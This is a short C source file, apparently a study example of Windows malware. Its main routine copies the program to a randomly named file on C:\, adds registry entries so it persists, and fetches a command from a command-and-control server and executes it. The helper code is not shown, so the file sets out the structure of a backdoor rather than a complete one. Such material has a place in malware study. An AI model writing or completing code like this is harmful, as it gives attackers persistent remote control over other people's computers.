/**
 * SCULEVTA.c
 * 7/3/2014
 *
 * Study software.
 *
 * A basic malware logic example, this file contain a main
 * logic.
 *
 * Goals:
 *  - Infect Storage;
 *  - Infect Registry;
 *  - Contact with Command Control Center;
 *  - Execute command;
 *  - Close;
 */

// Common libraries
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>

// Unique libraries
#include "inc/infection.h"
#include "inc/contact.h"
#include "inc/utils.h"

// Constants & Typedefs
#include "constants.h"

#pragma comment(lib, "wsock32.lib") // Library to link

/**
 * main
 *
 * Main function, start of the program.
 */
int main(int argc, char *argv[]) {
	// Generating a new path
	char file[1024];
	generateRandomNameWithPath(file, "c:\\", 6);

	// Infect storage
	if (!infectStorage(file))
		return EXIT_FAILURE;

	// Infect registry keys
	if (!infectRegistry(file))
		return EXIT_FAILURE;

	// Find command with C2
	char command[1024];
	lookupCommand(&command);
	if (strcmp(command, "") != 0) {
		// If command successfull received, execute
		if(!executeCommand(command)) return EXIT_FAILURE;
	}

	// End of program
	return EXIT_SUCCESS;
}
